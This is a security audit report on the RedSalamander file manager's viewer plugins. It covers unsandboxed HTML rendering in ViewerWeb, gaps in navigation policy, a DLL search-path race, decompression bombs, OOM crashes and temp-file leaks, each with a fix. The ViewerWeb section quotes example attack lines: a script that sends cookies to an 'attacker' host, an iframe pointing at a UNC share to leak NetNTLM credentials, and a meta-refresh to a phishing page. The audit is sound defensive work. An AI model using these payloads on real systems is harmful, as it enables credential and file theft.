# RedSalamander Viewer Plugins — Memory-Safety & Security Audit: Final Report

## 1. Verdict

The viewer subsystem is **functional but soft against hostile input**, and the most dangerous surface by a wide margin is **ViewerWeb**, which is effectively a malware-amenable HTML host: it navigates untrusted local `.html` files directly with a `file://` origin, full scripting, and no CSP, while the only navigation guard (`allowExternalNavigation`) defaults to *permit*, ignores subframes/popups entirely, and does not filter `file://`/UNC — yielding default-config drive-by JS execution, NetNTLM credential leakage via UNC, and same-origin local-file exfiltration from a passive "view." The second systemic theme is **unchecked file-/plugin-derived sizes and counts feeding allocations, indices, and dense vectors**: decompression-bomb pixel buffers (ImgRaw WIC), unbounded visual-line/`_nodes`/temp-file growth that aborts inside `noexcept` paths (`std::terminate`), and a host-side OOB walk over a plugin-reported `count`. A third theme is **synchronous heavy work on the UI thread** (large-chunk decode/index, libvlc init/`LoadLibrary`, and a UI-thread `jthread.join()` blocked on an uncancellable remote `Read`) producing trivially-triggered ANRs. Memory-safety in the strict sense is mostly *latent* (alignment UB, integer-overflow comparisons that stay in-bounds), but the **process-global `SetDllDirectoryW` raced across concurrent VLC loads** is a real DLL-search-path/planting exposure, and the **plugin-`count` OOB** is a genuine host-memory hazard. Net posture: ship-blocking issues are concentrated in ViewerWeb and the size/count-trust class; the rest is robustness debt.

## 2. Findings by Severity

### MEMORY-SAFETY / SECURITY / CRASH

**ViewerWeb is an unsandboxed local-HTML execution host (file:// origin, scripts on, no CSP)** — `Plugins/ViewerWeb/ViewerWeb.cpp:2709`, `:3540`, `:3741`, `:4106` — *security, CONFIRMED*.
For `ViewerWebKind::Web`, a real Win32/UNC path is returned unwrapped (`4106-4113`), turned into a `file://` URL (`2709`), and navigated directly (`3540`); `IsScriptEnabled=TRUE` (`3741`) and the CSP constant (`kInternalHtmlHead`) is never applied to this path. Opening a downloaded `report.html` containing `<script>fetch('https://attacker/x?d='+document.cookie)</script>` plus `fetch('file:///...')` runs attacker JS with local privileges and exfiltrates sibling files — pure drive-by from a passive view. **Fix:** never `Navigate()` the user's `file://` path; stream bytes through the existing virtual-host/`WebResourceRequested` sandbox under `https://viewer.redsalamander.invalid` with `default-src 'none'; connect-src 'none'`, or at minimum disable script for raw-HTML and gate *all* navigations.

**ViewerWeb navigation policy is bypassable and permissive by default (subframes, popups, file:///UNC, default-allow)** — `Plugins/ViewerWeb/ViewerWeb.cpp:3197`, `:3219`, `Plugins/ViewerWeb/ViewerWeb.h:89` — *security, CONFIRMED* (merged: 3 findings, same root cause = incomplete/permissive `NavigationStarting` policy on the Web kind).
- Only `add_NavigationStarting` is registered; no `add_FrameNavigationStarting` / `add_NewWindowRequested`, so `<iframe src="https://...">` and `window.open()` reach arbitrary remote origins even with `allowExternalNavigation=false` (`3197`).
- The Web branch cancels *only* top-level http(s) and only when the flag is false (`3219-3226`); every non-http scheme — including `file://server/share` UNC and `\\?\`/`\\.\` device paths — proceeds. A crafted `<iframe src="file://attacker-host/share/x">` or meta-refresh to UNC triggers an outbound SMB/WebDAV connection leaking **NetNTLM credentials**, or reads local files into the DOM.
- `allowExternalNavigation` defaults to `true` (`ViewerWeb.h:89`, schema default `"1"`), so a `<meta http-equiv=refresh content='0;url=https://attacker/phish'>` silently turns the trusted pane into a live remote phishing page out of the box.

**Fix:** register `FrameNavigationStarting` + `NewWindowRequested` with the same/stricter policy across all kinds; classify scheme and cancel `file://` UNC/device targets and anything escaping the extraction dir; default `allowExternalNavigation=false` and apply it to scripted/redirect/subframe navigations, not just top-level clicks.

**JSON/Markdown external links bypass `allowExternalNavigation` via unconditional `ShellExecuteW`** — `Plugins/ViewerWeb/ViewerWeb.cpp:3234` — *security, CONFIRMED*.
Non-Web kinds cancel top-level http(s) then unconditionally call `ShellExecuteW(...,L"open",uri,...)` with no flag check (`3234-3238`); `markdown-it` runs with `linkify:true` (`4516`), auto-linkifying bare URLs in untrusted Markdown. A user who explicitly set "Block" still launches the system browser on a file-controlled URL on click — a one-click drive-to-browser vector. **Fix:** honor `allowExternalNavigation` before `ShellExecuteW`, and allow-list schemes to `http/https/mailto` only (never `file:`/custom protocol handlers).

**Process-global `SetDllDirectoryW` held for the whole playback session and raced by concurrent async loads** — `Plugins/ViewerVLC/ViewerVLC.cpp:5014` — *security, CONFIRMED*.
`LoadVlcState` (threadpool) calls process-global `SetDllDirectoryW(installDir)` (`5014`) before `LoadLibraryW` and never restores it until `~VlcState`/`RetireVlcStateAsync` — so for the entire (hours-long) session every `LoadLibrary` by any thread/plugin/codec/COM in-proc server resolves against the VLC dir. Worse, `BeginAsyncVlcLoad` submits a new worker per Open with no serialization (no mutex anywhere), so worker B captures worker A's `installDir` as its "previous," and on retirement the restore chain reinstates a stale dir — **permanent process-state corruption** plus a DLL-planting window. **Fix:** stop mutating the global dir; rely on the already-built `--plugin-path` arg, or use `AddDllDirectory`/`LoadLibraryExW(LOAD_LIBRARY_SEARCH_*)` with an RAII cookie scoped to the single `LoadLibraryW`; if `SetDllDirectory` is unavoidable, serialize loads under one mutex and restore immediately after load.

**Host trusts plugin-reported `count`, walking `metaData[0..count-1]` out of bounds** — `RedSalamander/ViewerPluginManager.cpp:801`, `:940` — *memory-safety (corrected: robustness), PLAUSIBLE*.
Both `Discover()` (`798-808`) and `EnsureLoaded()` (`940-957`) iterate `count` `PluginMetaData` structs from `RedSalamanderEnumeratePlugins` with only `metaData != nullptr && count > 0` guards — no upper bound, no independent array-length knowledge. A DLL returning a 1-element array with `count = 0xFFFFFFFF` makes the host index past the array and `SafeCoalesce` wild `wchar_t*` pointers → OOB read / crash / info-disclosure. *Severity caveat:* the DLL is already `LoadLibraryExW`-loaded (ran arbitrary `DllMain`), so this is realistically a crash from a **buggy/ABI-mismatched** plugin rather than a security escalation. **Fix:** clamp `count` to a sane max (a few hundred), reject implausible counts as `E_FAIL` before the loop; prefer an indexed-accessor ABI over raw contiguous-array indexing.

**`directory_iterator` throwing `operator++` inside `noexcept Discover()` → `std::terminate`** — `RedSalamander/ViewerPluginManager.cpp:678` — *crash, PLAUSIBLE* (same pattern also at `FileSystemPluginManager.cpp:843`).
`Discover()` is `noexcept` (`618`); the optional-plugins range-for uses the throwing `operator++` overload and only checks the *construction* `ec` (`680`). An entry going inaccessible mid-walk (ACL change, removable/network volume vanishing, reparse failure) throws `filesystem_error` out of a `noexcept` function → `std::terminate`, killing the whole file manager instead of skipping the dir. *Caveat:* the dir is fixed at `<exeDir>\Plugins` (not relocatable), so the realistic trigger is the EXE on a network/removable medium or a concurrent ACL/deletion during startup/"Refresh plugins." **Fix:** iterate manually with `it.increment(ec)` breaking on `ec`, or wrap the loop body in try/catch; apply the same fix to `FileSystemPluginManager.cpp:843`.

### DOS / OOM (unbounded file-/plugin-derived sizes & counts → allocation/terminate)

**Decompression-bomb pixel buffer in the WIC decode path (~1 GiB from a few-KB PNG/GIF)** — `Plugins/ViewerImgRaw/ViewerImgRaw.Decode.cpp:742` — *dos-oom, CONFIRMED*.
`DecodeImageToBgraWic` only rejects per-axis `>16384`; a `16384×16384` image passes all checks and `outBgra.resize(1 GiB)` (`774`). PNG/GIF encode that in a few KB (solid color), bypassing `kMaxRawFileBytes` (source-bytes only). `StartPrefetchNeighbors` speculatively decodes neighbors on multiple workers, multiplying transient commit; `resize` throwing `bad_alloc` in a `noexcept` worker → `std::terminate`. (Note: the RAW/BMP path at `1314` shares the same per-axis-only cap.) **Fix:** cap total pixel count (tens of MP budget) for both paths, surface "image too large," and bound in-flight prefetch decode buffers.

**Unbounded visual-line expansion on a single very long line** — `Plugins/ViewerText/ViewerText.Text.cpp:2388` — *dos-oom, CONFIRMED*.
`RebuildTextVisualLines` (`noexcept`) pushes one entry into three vectors per `maxCols`-wide slice; `maxCols` floors to 1 at narrow width and `len` is the file-derived line length (up to ~128M wchars in a 256 MiB no-newline chunk). Reserve is sized by line *count*, not length, so the layouts vector alone balloons to ~6.6 GB → `bad_alloc` in `noexcept` → `std::terminate`, re-triggered on every `WM_SIZE`. **Fix:** compute visual segments lazily for the visible viewport only; hard-cap visual-line count with a "line truncated" sentinel; clamp `maxCols` to a sane minimum.

**Unbounded `_nodes` dense-vector resize keyed on scan-derived id inside `noexcept DrainUpdates`** — `Plugins/ViewerSpace/ViewerSpace.cpp:7012` — *dos-oom, CONFIRMED*.
`DrainUpdates` (`noexcept`) treats `_nodes` as a dense array indexed by node id and `resize(node.id+1)` (`7009-7013`, `7051-7055`); ids come from an uncapped atomic counter, `Node` is ~64 B, the only backpressure is byte-based sleeping that never drops nodes. A deep/wide tree (hundreds of millions of dirs) makes the resize tens of GB → `bad_alloc` in `noexcept` → `std::terminate`, killing the host. **Fix:** cap total node count (switch over-cap subtrees to an aggregated "N more folders"); never resize an unbounded `noexcept` vector keyed on scan ids — use a map/bounded arena and handle allocation failure.

**No depth/node cap; cyclic hostile `IFileSystem` plugin drives unbounded node growth to OOM** — `Plugins/ViewerSpace/ViewerSpace.cpp:6478` — *dos-oom, CONFIRMED*.
The only cycle defense is the advisory `isReparse` flag (`6471`), trusted from the plugin's `ReadDirectoryInfo`. A malicious `IFileSystem` (archive/network/virtual) returning a child whose path loops to an ancestor *without* `FILE_ATTRIBUTE_REPARSE_POINT` recurses indefinitely; `_nodes`/frontier/arena grow until OOM, and `nextId` crossing `0x40000000` corrupts the id namespace (`IsFileRecordId` misclassifies real dirs). **Fix:** enforce max recursion depth + max total nodes in `ScanMain` (mark Incomplete); maintain a visited-key set (file-id/volume+index or normalized path); clamp `nextId` below `kFileRecordIdBase`.

**Synchronous full-chunk decode + line/visual indexing on the UI thread (ANR)** — `Plugins/ViewerText/ViewerText.Text.cpp:3477` — *dos-oom, CONFIRMED*.
`LoadTextToEdit` (called from scroll/stream-nav handlers on the UI thread, e.g. `:417`) runs `MultiByteToWideChar` over up to 256 MiB plus two full linear passes (`RebuildTextLineIndex` + `RebuildTextVisualLines`) synchronously per chunk transition → multi-second freeze. **Fix:** move decode+indexing to a worker and post results back, or process incrementally with cooperative yielding; reduce default chunk size.

**PE parse worker `join()`ed on the UI thread, blocked on an uncancellable remote `Read`** — `Plugins/ViewerPE/ViewerPE.cpp:1833` — *dos-oom, CONFIRMED*.
`_worker` is a `std::jthread` member; move-assign (`StartAsyncParse` `1833`) and default-assign (`ResetDeviceResources` `1591`, reached from `WM_NCDESTROY`) `request_stop()` then `join()` on the UI thread. The worker blocks in `reader->Read` (16 MiB chunks, `1907`); `stop_requested()` is only checked *between* chunks and no `stop_callback` aborts an in-flight `Read`. Closing/navigating/refreshing a PE on a remote FS (Curl/S3/Drive) freezes the message pump until the stalled `Read` returns. **Fix:** migrate to the threadpool dispatch + module-keepalive + requestId-generation pattern; drop the `jthread` member; reduce chunk to ~1 MiB and check requestId/stop between chunks.

**Synchronous libvlc load + install auto-detection on the UI thread** — `Plugins/ViewerVLC/ViewerVLC.cpp:5121`, `:4916` — *dos-oom, CONFIRMED*.
`StartPlayback` (UI thread) always runs `AutoDetectVlcInstallDir` (registry reads, `SearchPathW`, up to 7×3 filesystem stats) inline (`4916`); on `TrySubmitThreadpoolCallback` failure it runs `LoadVlcState` (`LoadLibraryW` + 21 `GetProcAddress` + `libvlc_new`) directly on the UI thread (`5121`). VLC on a slow/network drive or threadpool pressure freezes the UI for seconds. **Fix:** move auto-detect onto the worker; on submit failure surface a deferred error/retry — never `libvlc_new`/`LoadLibrary(libvlc)` on the UI thread.

**Web kind copies an entire virtual-FS file to %TEMP% with no size cap (disk-fill DoS)** — `Plugins/ViewerWeb/ViewerWeb.cpp:4167` — *dos-oom, CONFIRMED*.
The Web non-Win32-path branch streams the whole `IFileReader` into a temp file with a 256 KiB buffer and **no** `maxBytes`/`GetSize` check (`4167-4197`), unlike the JSON/Markdown branch which enforces `maxDocumentMiB` (`4227`/`4258`). A multi-GB or bomb-backed remote `.html` (S3/curl/7z/Drive) fills the temp volume and hangs the load. **Fix:** `GetSize()` up front + reject over a Web-specific `maxBytes`, and add a running-byte cap inside the copy loop for unknown-length streams; surface `maxDocumentMiB` for the Web kind.

**UTF-16 BOM decode materializes a full second wide-char copy with no post-expansion size guard** — `Plugins/ViewerWeb/ViewerWeb.cpp:4026` — *dos-oom, PLAUSIBLE*.
`normalizeTextUtf8` (`noexcept`) allocates a whole-file `std::wstring` then a UTF-8 buffer while raw `bytes` stays live (~3.5× peak); the size guard bounds only raw bytes. With `maxDocumentMiB` raised to 512 a UTF-16-BOM doc drives ~1.8 GB transient; `bad_alloc` in `noexcept` → `std::terminate`. *Caveat:* default `maxDocumentMiB=32` (~112 MB) and x64/ARM64-only, so the worst case needs an admin-raised limit. **Fix:** apply the ceiling against post-expansion worst-case before allocating; decode in bounded chunks and free the wide buffer eagerly.

### DATA-LOSS

**Save-As with re-encoding silently writes only the in-memory chunk for streamed (large) files** — `Plugins/ViewerText/ViewerText.cpp:8665` — *data-loss, CONFIRMED*.
When `_textStreamActive`, `_textBuffer` holds only the current chunk; the re-encode path opens the dest `CREATE_ALWAYS` (`8369`) and writes `_textBuffer.data(), .size()` (`8665`). The truncation guard only rejects an *empty* buffer (`8655`), and the only truncation signal is an **Info** alert shown *after* the write (`8682`). The user believes they saved a re-encoded whole file but got a truncated one; targeting the source path destroys the original. (The KEEP_ORIGINAL path correctly re-reads the full source.) **Fix:** when streaming, either refuse the re-encode Save with explicit confirmation *before* opening the dest, or stream the full source through the encoder via `_fileReader`; warn before writing.

### LEAK

**Temp DB snapshot created without delete-on-close leaks plaintext DB copies on crash** — `Plugins/ViewerSqlite/ViewerSqlite.Engine.cpp:432` — *leak, CONFIRMED*.
`CopyReaderToSnapshot` opens the snapshot without `FILE_FLAG_DELETE_ON_CLOSE` (`432`); cleanup is only `~DatabaseSource` → `std::filesystem::remove` gated on `_deleteOnClose` (`490-499`). For remote/cloud/archive DBs a full cleartext copy lands in `%TEMP%\rsq*.tmp`; on crash/kill before the destructor runs it persists, readable by other same-user processes. No `DELETE_ON_REBOOT`/`atexit` fallback exists. **Fix:** stage in a per-session secure subdir held open with `FILE_FLAG_DELETE_ON_CLOSE` (feed SQLite via immutable URI/VFS) or register `MoveFileExW(MOVEFILE_DELAY_UNTIL_REBOOT)`; harden the destructor to best-effort remove regardless of the flag.

**Extracted Web temp file leaks when WebView2 holds it open across rapid switches / abnormal exit** — `Plugins/ViewerWeb/ViewerWeb.cpp:2695` — *leak, PLAUSIBLE*.
All deletion sites (`2697`, `1633`, `2038`) swallow the `error_code` and overwrite `_tempExtractedPath` without retry; no `MOVEFILE_DELAY_UNTIL_REBOOT`, no `DELETE_ON_CLOSE`, no outstanding-path list, no kill-time cleanup. When the renderer still maps `rsw####.ext` during a rapid Ctrl+Down or mid-navigation close, `remove()` fails and the file orphans in `%TEMP%`. *PLAUSIBLE:* depends on WebView2 lock timing. **Fix:** track all outstanding temp paths, retry deletion each load/close, register undeletable ones via `MoveFileExW(MOVEFILE_DELAY_UNTIL_REBOOT)`, or extract into a per-instance folder removed wholesale on Close.

## 3. Cross-cutting Themes

1. **Trusting file-/plugin-derived sizes, counts, and offsets without bounds.** Header/field-derived values flow straight into allocations (`outBgra.resize` 1 GiB; UTF-16 wide copy), dense-vector indices (`_nodes.resize(node.id+1)`), loop counts (`metaData[i]` for `i<count`), and aggregate accumulators (`uint32_t` file counts; `EndOfFile` up to INT64_MAX). The recurring fix is the same everywhere: validate against a sane ceiling *before* allocating/indexing, use 64-bit/saturating arithmetic, and compute potentially-overflowing products in a wider type before comparison (the EXIF `count*2u<=4u` and the WIC per-axis-only cap are the same mistake in two parsers).

2. **`bad_alloc` inside `noexcept` → `std::terminate` as a DoS amplifier.** Multiple unbounded growths run inside `noexcept` functions (`RebuildTextVisualLines`, `DrainUpdates`, `normalizeTextUtf8`), so the *robustness* failure of an oversized allocation escalates to a *whole-process crash*. Any unbounded container operation keyed on untrusted input must not live under `noexcept`.

3. **Synchronous heavy work / blocking joins on the UI thread.** Large-chunk decode+index (Text), libvlc init/`LoadLibrary` (VLC), and a `jthread.join()` on an uncancellable remote `Read` (PE) all freeze the message pump. The fix pattern is uniform: threadpool dispatch + generation/requestId result-guard + cancellable, small-chunk I/O — a pattern other viewers already use.

4. **Advisory / single-source cycle and trust guards.** ViewerSpace relies solely on the plugin-supplied `FILE_ATTRIBUTE_REPARSE_POINT` for cycle protection (no visited-set), and the host relies on the plugin's contiguity/`count` contract. Trusting a single attacker-controllable signal as the only safety check recurs across the scan and the plugin loader.

5. **ViewerWeb: incomplete navigation mediation + permissive defaults.** A single conceptual gap — the `NavigationStarting`-only, top-level-http-only, default-allow policy — produces five distinct exposures (raw file:// load, subframe/popup bypass, file://-UNC creds, default-allow remote nav, ShellExecute bypass). The principle violated: untrusted content must render in a *sandboxed origin with a deny-by-default CSP and full navigation mediation (top-level + subframe + new-window)*, never the user's `file://` path.

6. **Sensitive temp artifacts without crash-safe cleanup.** Both the SQLite plaintext snapshot and the ViewerWeb extracted temp rely on a normal-path destructor/`remove()` with no `DELETE_ON_CLOSE` / `DELAY_UNTIL_REBOOT` fallback, so abnormal exit leaks data/files.

## 4. Coverage & Residual Risk

**Audited (source-level, this report):** ViewerText core load/lifecycle, text layout/render, encoding detection/convert, hex view; ViewerSqlite engine/query open modes and snapshot lifecycle, UI/results sorting; ViewerSpace directory-scan buffer parser, node-tree growth, id namespace, treemap aggregation; ViewerImgRaw WIC + RAW/thumbnail decode, EXIF TIFF parser, export/save write path; ViewerVLC libvlc integration (load/DLL-dir/threading/config); ViewerPE async parse worker lifetime; ViewerWeb lifecycle/content load, temp extraction, and the full navigation/CSP/escaping policy; and the host-side `ViewerPluginManager` discovery/load/localization paths. The IViewer contract surface was exercised indirectly through these.

**Residual risk requiring a human and/or fuzzing:**
- **Third-party library internals are trust boundaries this audit could not pierce:** LibRaw (does `thumb.tlength` ever exceed the real allocation? crafted-RAW parser bugs), libjpeg-turbo (`DecodeJpegToBgraTurboJpeg` on malformed JPEG), pe-parse (malformed PE robustness; setjmp/longjmp vs. C++ exception interplay), WebView2/Edge (renderer file-lock timing for the temp-leak finding; actual subframe/new-window event semantics), and SQLite read-only-vs-hot-journal behavior. Each PLAUSIBLE finding gated on library behavior (thumbnail OOB, Web temp leak, SQLite write-back) should be confirmed empirically.
- **A real crafted-file fuzz corpus is needed** against each parser: TIFF/EXIF IFDs, RAW thumbnails, the ViewerSpace `FileInfo`/`NextEntryOffset` directory-buffer walk (alignment + bounds), UTF-8/UTF-16/DBCS chunk-boundary decoding, and PNG/GIF/HEIC dimension/decompression-bomb inputs. The alignment-UB and integer-overflow findings stay in-bounds today but are exactly what a fuzzer + UBSan/ASan would surface deterministically on stricter codegen/ARM64.
- **A hostile-`IFileSystem` plugin harness** is the highest-value test rig: one that returns pathological `ReadDirectoryInfo` buffers (huge `count`, misaligned `NextEntryOffset`, INT64_MAX `EndOfFile`, non-reparse cycles, >2^32 entries) and a malformed `RedSalamanderEnumeratePlugins` (`count=0xFFFFFFFF`) would directly exercise the ViewerSpace OOM/UB/overflow class and the host OOB-`count` finding under instrumentation.
- **ViewerWeb needs a manual red-team pass in a live WebView2** to confirm the iframe-UNC NetNTLM leak, default-allow meta-refresh phishing, and local-file exfiltration end to end, since exploitation depends on WebView2's runtime navigation/sub-resource semantics rather than source alone.
- **Concurrency/teardown timing** (the VLC `SetDllDirectoryW` race, the PE UI-thread join) should be stress-tested with rapid open/close/navigate loops and threadpool starvation injected, as the worst outcomes are timing-dependent.
